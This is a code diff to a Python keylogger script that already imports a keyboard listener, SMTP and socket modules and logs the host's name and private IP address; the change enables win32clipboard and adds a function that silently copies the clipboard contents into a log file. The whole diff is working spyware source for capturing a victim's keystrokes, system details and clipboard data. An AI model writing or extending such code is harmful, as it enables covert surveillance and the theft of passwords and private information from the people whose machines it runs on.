@@ -12,7 +12,7 @@ from smtplib import SMTP
 import socket
 import platform
 
-#import win32clipboard
+import win32clipboard
 
 from pynput.keyboard import Key, Listener
 
@@ -61,7 +61,19 @@ def computer_information():
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPaddr + "\n")
 computer_information()
- 
+
+def copy_clipboard():
+    with open(file_path + extend + clipboard_information, "a") as f:
+        try:
+            win32clipboard.OpenClipboard()
+            data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: \n" + data)
+
+        except:
+            f.write("Clipboard could not be copied")
+copy_clipboard()
 
 count = 0
 keys=[]
